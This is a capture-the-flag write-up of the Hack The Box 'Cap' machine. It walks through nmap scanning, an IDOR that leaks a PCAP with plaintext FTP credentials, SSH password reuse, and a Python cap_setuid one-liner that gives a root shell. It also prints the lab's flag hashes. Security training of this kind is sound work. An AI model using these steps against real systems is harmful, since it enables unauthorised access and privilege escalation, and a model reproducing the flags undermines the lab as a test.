# HTB Cap — Writeup

**Platform:** Hack The Box  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 2026-05-31  
**Author:** GP Singh (PyHackSecGP)

---

## Overview

Cap is an easy Linux machine that chains two classic vulnerabilities: an IDOR on a web app that leaks a PCAP containing plaintext FTP credentials, and a Linux capabilities misconfiguration that allows instant privilege escalation to root. Both issues are textbook but still show up in production environments — especially internal tooling built without security review.

---

## Reconnaissance

```bash
nmap -sC -sV -oN nmap_services.txt 10.129.12.255
nmap -p- --min-rate 5000 -oN nmap_allports.txt 10.129.12.255
```

**Open ports:**
- `21/tcp` — vsftpd 3.0.3 (anonymous login disabled)
- `22/tcp` — OpenSSH 8.2p1 Ubuntu
- `80/tcp` — Gunicorn HTTP server ("Security Dashboard")

FTP anonymous login was blocked. SSH needs creds. Web app is the entry point.

---

## Enumeration

Browsing to `http://10.129.12.255` shows a "Security Dashboard" running on Gunicorn. The nav bar reveals the logged-in username: **nathan**.

The app has a `/capture` endpoint that runs a 5-second packet capture and saves it to `/data/<id>`, downloadable at `/download/<id>`. After triggering a capture, the redirect lands at `/data/1`.

**IDOR test:** Manually navigate to `/data/0`.

It works. The app doesn't validate ownership — it returns a pre-existing capture file from box initialization. Download it:

```bash
curl http://10.129.12.255/download/0 -o capture0.pcap
```

---

## Exploitation

Inspect the PCAP:

```bash
tcpdump -r capture0.pcap -A
```

The capture contains a plaintext FTP session. FTP transmits credentials unencrypted over the wire:

```
USER nathan
PASS Buck3tH4TF0RM3!
```

Password reuse check — try SSH:

```bash
ssh nathan@10.129.12.255
# password: Buck3tH4TF0RM3!
```

Shell as `nathan`. Grab user flag:

```bash
cat ~/user.txt
# ea34748abba367e85ac0aec4f9932bad
```

---

## Privilege Escalation

Standard privesc checklist. `sudo -l` returns nothing useful. Check Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

Output:
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` on a Python interpreter means any process it spawns can call `setuid(0)` — escalating to root without needing a SUID binary or sudo. This is a capability misconfiguration, not a CVE — it's a conscious (or accidental) admin decision.

One-liner to root:

```bash
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Root shell. Grab root flag:

```bash
cat /root/root.txt
# 3a0175a10c1007605d6b3813fb2cb37b
```

---

## Vulnerability Summary

| # | Vulnerability | CWE | MITRE ATT&CK |
|---|---------------|-----|--------------|
| 1 | IDOR on `/data/<id>` — no ownership check | CWE-639 | T1083 — File and Directory Discovery |
| 2 | FTP plaintext credentials in PCAP | CWE-319 | T1040 — Network Sniffing |
| 3 | `cap_setuid` on Python interpreter | CWE-272 | T1548 — Abuse Elevation Control Mechanism |

---

## Key Takeaways

**IDOR on sequential IDs is always the first check.** If an app redirects you to `/data/1`, try `/data/0`. It costs 5 seconds and pays off constantly.

**FTP is dead.** Any PCAP capturing an FTP session captures the password — no decryption, no cracking, just read. Use SFTP or SCP. Always.

**Linux capabilities are a privesc goldmine.** After getting a shell, `getcap -r / 2>/dev/null` is non-negotiable in your checklist. `cap_setuid` on any scripting interpreter (Python, Perl, Ruby) is game over — one line of code to root.

**Password reuse is still everywhere.** The FTP password worked on SSH directly. Always test recovered creds against every open service.

---

## Tools Used

- `nmap` — port scanning
- `curl` — IDOR download
- `tcpdump` — PCAP analysis
- `ssh` — initial access
- `getcap` — capability enumeration
- `python3` — privilege escalation

---

*Follow me on GitHub: [PyHackSecGP](https://github.com/PyHackSecGP)*
